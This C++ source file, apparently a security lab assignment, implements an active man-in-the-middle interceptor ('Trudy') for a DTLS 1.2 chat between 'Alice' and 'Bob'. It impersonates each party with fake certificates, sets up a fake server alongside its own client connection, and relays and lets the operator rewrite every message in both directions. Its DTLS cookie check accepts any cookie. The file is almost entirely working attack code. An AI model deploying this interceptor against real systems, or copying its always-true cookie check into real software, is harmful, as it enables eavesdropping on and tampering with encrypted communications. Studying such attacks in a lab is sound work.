    #include <iostream>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <cstring>
    #include <unistd.h>
    #include <openssl/ssl.h>
    #include <openssl/err.h>
    #include <arpa/inet.h>
    #include <netdb.h>

    using namespace std;

    #define BUFFER_SIZE 2048
    #define SERVER_PORT 12345       // Port number of Bob
    char *SERVER_IP = "172.31.0.3"; // IP address of Bob

    #define TRU_SERVER_PORT 12345      // Port number of Trudy same as Bob
    #define TRU_SERVER_IP "172.31.0.4" // IP address of Trudy

    struct sockaddr_in serverAddr;

    // Define paths to the private keys and certificates for Alice and Bob
    const char *ALICE_CERT_PATH = "fake_alice.crt";
    const char *ALICE_KEY_PATH = "alice_private_key.pem";

    const char *BOB_CERT_PATH = "fake_bob.crt";
    const char *BOB_KEY_PATH = "bob_private_key.pem";

    const char *COMBINED_CERT_PATH = "combined.crt";

    class Client
    {
    private:
        string server_name;

    public:
        Client(string server_name) : server_name(server_name) {}

        int setting_up_udp_sock_for_conn()
        {
            int clientSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

            if (clientSocket == -1)
            {
                perror("....Socket creation failed....");
                return -1;
            }

            // struct sockaddr_in serverAddr;
            serverAddr.sin_family = AF_INET;
            serverAddr.sin_port = htons(SERVER_PORT);
            serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);

            cout << "Connected with IP address: " << inet_ntoa(serverAddr.sin_addr) << endl;

            return clientSocket;
        }

        SSL *dtls_client(int clientSocket, SSL_CTX *ctx)
        {

            // Create a SSL object
            SSL *ssl = SSL_new(ctx);

            if (!ctx)
            {
                perror("....Failed to create SSL context....");
                return ssl;
            }

            if (!ssl)
            {
                perror("....Failed to create SSL object....");
                SSL_CTX_free(ctx);
                return ssl;
            }

            // Load Alice's certificate
            if (SSL_CTX_use_certificate_file(ctx, ALICE_CERT_PATH, SSL_FILETYPE_PEM) <= 0)
            {
                perror("Failed to load Alice's certificate file");
                SSL_CTX_free(ctx);
                return ssl;
            }

            // Load Alice's private key
            if (SSL_CTX_use_PrivateKey_file(ctx, ALICE_KEY_PATH, SSL_FILETYPE_PEM) <= 0)
            {
                perror("Failed to load Alice's private key file");
                SSL_CTX_free(ctx);
                return ssl;
            }

            socklen_t serverLen = sizeof(serverAddr);

            if (connect(clientSocket, (struct sockaddr *)&serverAddr, serverLen) < 0)
            {
                perror("....Invalid address/ Address not supported....");
                return ssl;
            }

            // Set the cipher suites for perfect forward secrecy (PFS) at client side
            const char *cipher_list = "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384";
            if (SSL_CTX_set_cipher_list(ctx, cipher_list) != 1)
            {
                cerr << "Failed to set cipher list" << endl;
                SSL_CTX_free(ctx);
                return ssl;
            }

            // Exchange application layer control messages
            char msg_from_server[BUFFER_SIZE];
            char msg_to_send[BUFFER_SIZE];
            const char *chat_hello = "chat_hello";
            const char *chat_ok_reply = "chat_ok_reply";

            // Send chat_hello message
            if (sendto(clientSocket, chat_hello, strlen(chat_hello), 0, (struct sockaddr *)&serverAddr, serverLen) < 0)
            {
                cerr << "Error sending message to server..." << endl;
                close(clientSocket);
                return ssl;
            }

            char buffer[BUFFER_SIZE];
            int reply;

            // Wait for chat_ok_reply from server to close application control messages
            reply = recvfrom(clientSocket, buffer, sizeof(buffer), 0, (struct sockaddr *)&serverAddr, &serverLen);

            // Receive chat_START_SSL_ACK message
            if (reply < 0)
            {
                cerr << "Error receiving message from server..." << endl;
                return ssl;
            }

            if (reply >= 0)
            {
                msg_from_server[reply] = '\0';

                string msg = "";
                for (int i = 0; i < reply; i++)
                {
                    msg += buffer[i];
                }
                // cout<<msg<<endl;
                cout << "Received Message Server: " << msg << endl;

                if (msg != "chat_ok_reply")
                {
                    cerr << "Unexpected response from server" << endl;
                    SSL_CTX_free(ctx);
                    return ssl;
                }
            }

            // Send chat_START_SSL message
            strcpy(msg_to_send, "chat_START_SSL");
            if (sendto(clientSocket, msg_to_send, strlen(msg_to_send), 0, (struct sockaddr *)&serverAddr, serverLen) < 0)
            {
                cerr << "Error sending message to server..." << endl;
                close(clientSocket);
                return ssl;
            }

            // Receive chat_START_SSL_ACK message
            reply = recvfrom(clientSocket, buffer, sizeof(buffer), 0, (struct sockaddr *)&serverAddr, &serverLen);

            if (reply >= 0)
            {
                msg_from_server[reply] = '\0';

                string msg = "";
                for (int i = 0; i < reply; i++)
                {
                    msg += buffer[i];
                }
                cout << "Received Message from server: " << msg << endl;

                if (msg == "chat_START_SSL_NOT_SUPPORTED")
                {
                    cerr << "Bob does not have capability to set up secure chat communication" << endl;
                    SSL_shutdown(ssl);
                    SSL_free(ssl);
                    SSL_CTX_free(ctx);
                    return ssl;
                }

                else if (msg != "chat_START_SSL_ACK")
                {
                    cerr << "Unexpected response from server" << endl;
                    SSL_shutdown(ssl);
                    SSL_free(ssl);
                    SSL_CTX_free(ctx);
                    return ssl;
                }
                else if (msg == "chat_START_SSL_NOT_SUPPORTED")
                {
                    cerr << "Bob does not have capability to set up secure chat communication" << endl;
                    SSL_shutdown(ssl);
                    SSL_free(ssl);
                    SSL_CTX_free(ctx);
                    return ssl;
                }
            }
            else
            {
                cerr << "Error receiving message from server..." << endl;
                return ssl;
            }

            // Load CA certificate and set up verification locations
            if (SSL_CTX_load_verify_locations(ctx, COMBINED_CERT_PATH, NULL) != 1)
            {
                perror("Failed to load CA certificate for verification");
                SSL_free(ssl);
                SSL_CTX_free(ctx);
                cout << ":" << endl;
            };

            SSL_set_fd(ssl, clientSocket);
            // Perform SSL handshake
            if (SSL_connect(ssl) <= 0)
            {
                perror("SSL handshake failed");
                SSL_free(ssl);
                SSL_CTX_free(ctx);

                return ssl;
            }

            // DTLS v1.2 Handshake Successful
            cout << "....DTLS v1.2 Handshake Successful...." << endl;

            return ssl;
        }
    };

    class Server
    {
    public:
        int setup_udp_socket()
        {
            int serverSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
            if (serverSocket == -1)
            {
                perror("Socket creation failed");
                return -1;
            }

            struct sockaddr_in serverAddr;
            serverAddr.sin_family = AF_INET;
            serverAddr.sin_addr.s_addr = htonl(INADDR_ANY); // Listen on all interfaces
            serverAddr.sin_port = htons(TRU_SERVER_PORT);

            if (bind(serverSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) < 0)
            {
                perror("Bind failed");
                close(serverSocket);
                return -1;
            }
            return serverSocket;
        }

        static int generate_cookie(SSL *ssl, unsigned char *cookie, unsigned int *cookie_len)
        {
            memcpy(cookie, "cookie", 6);
            *cookie_len = 6;

            return 1;
        }

        static int verify_cookie(SSL *ssl, const unsigned char *cookie, unsigned int cookie_len)
        {
            return 1;
        }

        // Here Trudy is making (upto dtls)connection with Server(Bob) First then creating server of own and then Alice will connect with this server 
        int dtls_server()
        {
            // Initialize OpenSSL library functions
            SSL_library_init();
            SSL_load_error_strings();
            OpenSSL_add_ssl_algorithms();

            Client client("server_name");
            int trudy_as_aliceSocket = client.setting_up_udp_sock_for_conn();

            // Create SSL context for storing config. info. about the SSL connections
            SSL_CTX *ctx_client = SSL_CTX_new(DTLSv1_2_client_method());
            SSL_CTX_set_security_level(ctx_client, 1);

            SSL *ssl_client = client.dtls_client(trudy_as_aliceSocket, ctx_client);


            // Create SSL context using TLS_server_method() for DTLS compatibility
            SSL_CTX *ctx = SSL_CTX_new(DTLSv1_2_server_method());
            SSL_CTX_set_security_level(ctx, 1);

            if (!ctx)
            {
                perror("Failed to create Fake SSL context");
                return -1;
            }

            // Load Bob's certificate and private key
            if (SSL_CTX_use_certificate_file(ctx, BOB_CERT_PATH, SSL_FILETYPE_PEM) <= 0)
            {
                perror("Failed to load Fake Bob's certificate file");
                SSL_CTX_free(ctx);
                return -1;
            }

            if (SSL_CTX_use_PrivateKey_file(ctx, BOB_KEY_PATH, SSL_FILETYPE_PEM) <= 0)
            {
                perror("Failed to load Fake Bob's private key file");
                SSL_CTX_free(ctx);
                return -1;
            }

            SSL_CTX_set_mode(ctx, SSL_MODE_AUTO_RETRY);
            SSL_CTX_set_cookie_generate_cb(ctx, generate_cookie);
            SSL_CTX_set_cookie_verify_cb(ctx, verify_cookie);

            // Set the cipher suites for perfect forward secrecy (PFS) at server side
            const char *cipher_list = "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305";
            if (SSL_CTX_set_cipher_list(ctx, cipher_list) != 1)
            {
                cerr << "Failed to set cipher list" << endl;
                SSL_CTX_free(ctx);
                return -1;
            }

            //  Trudy is setting
            int serverSocket = setup_udp_socket();
            SSL *ssl = NULL;

            while (true)
            {
                if (serverSocket == -1)
                {
                    break;
                }
                struct sockaddr_storage clientAddr;
                socklen_t clientAddrLen = sizeof(clientAddr);

                // Exchange application layer control messages
                char msg_from_client[BUFFER_SIZE];
                char msg_to_send[BUFFER_SIZE];
                string chat_hello = "chat_hello";
                char *chat_ok_reply = "chat_ok_reply";
                struct timeval timeout;

                timeout.tv_sec = 20; // 20 seconds timeout
                timeout.tv_usec = 0;
                if (setsockopt(serverSocket, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout)) < 0)
                {
                    std::cerr << "Error setting socket options: " << strerror(errno) << std::endl;
                    close(serverSocket);
                    return -1;
                }
                // Wait for chat_hello message from client
                int len = recvfrom(serverSocket, msg_from_client, BUFFER_SIZE, 0, (struct sockaddr *)&clientAddr, &clientAddrLen);
                while (len == 0)
                {
                    cout << "waiting for client" << endl;
                    len = recvfrom(serverSocket, msg_from_client, BUFFER_SIZE, 0, (struct sockaddr *)&clientAddr, &clientAddrLen);
                }
                string msg = "";
                for (int i = 0; i < len; i++)
                {
                    msg += msg_from_client[i];
                }

                if (len > 0)
                {
                    msg_from_client[len] = '\0';
                    cout << "Received from Client: " << msg << endl;
                    if (msg != "chat_hello")
                    {
                        cerr << "Unexpected message from client" << endl;
                        close(serverSocket);
                        break;
                    }
                }

                // Accept the connection and create a new SSL object
                ssl = SSL_new(ctx);

                if (!ssl)
                {
                    perror("Failed to accept connection");
                    SSL_CTX_free(ctx);
                    close(serverSocket);
                    break;
                }

                // Send chat_ok_reply message
                // strcpy(msg_to_send, chat_ok_reply);
                int flg = 0;
                while (true)
                {
                    if (sendto(serverSocket, chat_ok_reply, strlen(chat_ok_reply), 0, (struct sockaddr *)&clientAddr, sizeof(clientAddr)) < 0)
                    {
                        cerr << "Error communicating with client..." << std::endl;
                        close(serverSocket);
                        break;
                    }

                    // Exchange SSL control messages

                    // Wait for chat_START_SSL message from client
                    len = recvfrom(serverSocket, msg_from_client, BUFFER_SIZE, 0, (struct sockaddr *)&clientAddr, &clientAddrLen);
                    if (len < 0)
                    {
                        cerr << "Error communicating with client connection closed..." << std::endl;
                        break;
                    }
                    if (len > 0)
                    {
                        msg_from_client[len] = '\0';
                        msg = "";
                        for (int i = 0; i < len; i++)
                        {
                            msg += msg_from_client[i];
                        }
                        cout << "====================================================" << endl;
                        cout << "Received Message: " << msg << endl;

                        if (msg != "chat_START_SSL")
                        {
                            // cout<<"Fall Back to normal communication";
                            cerr << "Unexpected message from client" << endl;
                            SSL_free(ssl);
                            SSL_CTX_free(ctx);
                            close(serverSocket);
                            break;
                        }
                        if (msg == "chat_START_SSL")
                        {
                            break;
                        }
                    }
                    else
                    {
                        flg = 1;
                        break;
                    }
                }
                if (flg == 1)
                {
                    cout << "Waiting for client to connect again" << endl;
                    continue;
                }

                // Send chat_START_SSL_ACK message
                strcpy(msg_to_send, "chat_START_SSL_ACK");
                if (sendto(serverSocket, msg_to_send, strlen(msg_to_send), 0, (struct sockaddr *)&clientAddr, sizeof(clientAddr)) < 0)
                {
                    cerr << "Error communicating with client..." << std::endl;
                    close(serverSocket);
                    break;
                }

                BIO *bio = BIO_new_dgram(serverSocket, BIO_NOCLOSE);

                if (!bio)
                {
                    perror("Failed to create UDP BIO");
                    SSL_CTX_free(ctx);
                    close(serverSocket);
                    break;
                }

                SSL_set_bio(ssl, bio, bio);

                if (DTLSv1_listen(ssl, (BIO_ADDR *)&clientAddr) <= 0)
                {
                    cout << "Failed to set DTLS listen" << endl;
                    ERR_print_errors_fp(stderr);
                    SSL_free(ssl);
                    break;
                }

                if (SSL_accept(ssl) <= 0)
                {
                    cout << "SSL Handshake Failed" << endl;
                    cerr << SSL_get_error(ssl, SSL_accept(ssl)) << endl;
                    // normal_socket_communication(serverSocket); // Fallback to normal socket communication
                }

                if (trudy_as_aliceSocket < 0 || serverSocket < 0)
                {
                    cerr << "Failed to create sockets for Alice and Bob" << endl;
                    return 1;
                }

                // Now actual messages can be exchanged
                while (true)
                {

                    char msg[BUFFER_SIZE];

                    cout << "Waiting for Client(Alice) Message..." << endl;
                    // Read message from client using SSL_read
                    len = SSL_read(ssl, msg, BUFFER_SIZE);
                    if (len <= 0)
                    {
                        cout << "***Alert***" << endl;
                        cout << "Connection closed due to inactive conncetion" << endl;
                        break;
                    }
                    if (len < 0)
                    {
                        cout << "Connection closed" << endl;
                        SSL_write(ssl_client, msg, strlen(msg));
                        // Cleanup
                        SSL_shutdown(ssl);
                        SSL_free(ssl);
                        SSL_CTX_free(ctx);
                        close(serverSocket);
                        // Cleanup
                        SSL_shutdown(ssl_client);
                        SSL_free(ssl_client);
                        SSL_CTX_free(ctx_client);
                        close(trudy_as_aliceSocket);
                        return 0;
                    }
                    if (len > 0)
                    {
                        msg[len] = '\0';
                        cout << "Message from Alice: " << endl;

                        string msggot = "";
                        for (int i = 0; i < len; i++)
                        {
                            msggot += msg[i];
                        }
                        cout << msggot << endl;

                        if (msggot == "chat_close")
                        {
                            cout << "Connection closed from client side" << endl;
                            SSL_write(ssl_client, msg, strlen(msg));
                            // Cleanup
                            SSL_shutdown(ssl);
                            SSL_free(ssl);
                            SSL_CTX_free(ctx);
                            close(serverSocket);
                            // Cleanup
                            SSL_shutdown(ssl_client);
                            SSL_free(ssl_client);
                            SSL_CTX_free(ctx_client);
                            close(trudy_as_aliceSocket);
                            return 0;
                        }
                    }
                    else
                    {
                        perror("Failed to receive message from client");
                        break;
                    }

                    cout << "Send Message to Bob: ";
                    cin.getline(msg, BUFFER_SIZE);
                    SSL_write(ssl_client, msg, strlen(msg));

                    string chatmsg = "";
                    for (int i = 0; i < strlen(msg); i++)
                    {
                        chatmsg += msg[i];
                    }

                    if (chatmsg == "chat_close")
                    {
                        cout << "Closeing Client ...." << endl;
                        SSL_write(ssl, msg, strlen(msg));
                        // Cleanup
                        SSL_shutdown(ssl);
                        SSL_free(ssl);
                        SSL_CTX_free(ctx);
                        close(serverSocket);
                        // Cleanup
                        SSL_shutdown(ssl_client);
                        SSL_free(ssl_client);
                        SSL_CTX_free(ctx_client);
                        close(trudy_as_aliceSocket);
                        return 0;
                    }

                    cout << "Waiting for Server(Bob) Message..." << endl;

                    int reply = SSL_read(ssl_client, msg, BUFFER_SIZE);
                    if (reply > 0)
                    {
                        msg[reply] = '\0';
                        cout << "Message from Server(Bob): " << endl;

                        string chatgotmsg = "";
                        for (int i = 0; i < reply; i++)
                        {
                            chatgotmsg += msg[i];
                        }
                        cout << chatgotmsg << endl;

                        if (chatgotmsg == "chat_close")
                        {
                            cout << "Closeing Client ...." << endl;
                            SSL_write(ssl, msg, strlen(msg));
                            // Cleanup
                            SSL_shutdown(ssl);
                            SSL_free(ssl);
                            SSL_CTX_free(ctx);
                            close(serverSocket);
                            // Cleanup
                            SSL_shutdown(ssl_client);
                            SSL_free(ssl_client);
                            SSL_CTX_free(ctx_client);
                            close(trudy_as_aliceSocket);
                            return 0;
                        }
                    }
                    cout << "Send Message to Alice: ";
                    cin.getline(msg, BUFFER_SIZE);
                    SSL_write(ssl, msg, strlen(msg));

                    chatmsg = "";

                    for (int i = 0; i < strlen(msg); i++)
                    {
                        chatmsg += msg[i];
                    }

                    if (chatmsg == "chat_close")
                    {
                        cout << "Closeing Client ...." << endl;
                        SSL_write(ssl_client, msg, strlen(msg));
                        // Cleanup
                        SSL_shutdown(ssl);
                        SSL_free(ssl);
                        SSL_CTX_free(ctx);
                        close(serverSocket);
                        // Cleanup
                        SSL_shutdown(ssl_client);
                        SSL_free(ssl_client);
                        SSL_CTX_free(ctx_client);
                        close(trudy_as_aliceSocket);
                        return 0;
                    }
                }

                // Cleanup
                SSL_shutdown(ssl);
                SSL_free(ssl);
                SSL_CTX_free(ctx);
                close(serverSocket);
                // Cleanup
                SSL_shutdown(ssl_client);
                SSL_free(ssl_client);
                SSL_CTX_free(ctx_client);
                close(trudy_as_aliceSocket);
                return 0;
            }

            return 0;
        }
    };

    int main(int argc, char *argv[])
    {

        if (argc != 4)
        {
            cerr << "Usage: ./secure_chat_active_interceptor -m alice1 bob1" << endl;
            return 1;
        }

        string option = argv[1];
        char *alice_ip = argv[2];
        char *bob_ip = argv[3];

        struct addrinfo hints, *res, *p;
        int status;

        struct hostent *host = gethostbyname(argv[2]);
        struct in_addr *address = (struct in_addr *)host->h_addr_list[0];

        alice_ip = inet_ntoa(*address);

        host = gethostbyname(argv[3]);
        address = (struct in_addr *)host->h_addr_list[0];

        bob_ip = inet_ntoa(*address);
        SERVER_IP = bob_ip;

        if (option != "-m")
        {
            cerr << "Invalid option. Use -m to perform the MITM attack." << endl;
            return 1;
        }

        Server server;

        server.dtls_server();
    }
